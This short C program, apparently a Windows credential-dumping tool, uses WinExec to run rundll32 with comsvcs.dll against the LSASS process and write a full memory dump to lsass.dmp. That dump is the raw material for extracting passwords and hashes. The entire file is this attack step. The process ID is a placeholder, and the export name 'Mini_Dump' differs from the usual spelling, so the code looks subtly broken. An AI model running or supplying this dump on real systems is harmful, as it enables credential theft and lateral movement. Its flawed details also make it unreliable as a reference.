#include <windows.h>

#define RUN(toRun) WinExec(toRun, SW_SHOW);

int main() {
    RUN("rundll32.exe C:\\Windows\\System32\\comsvcs.dll Mini_Dump PID lsass.dmp full");
    return 0;
}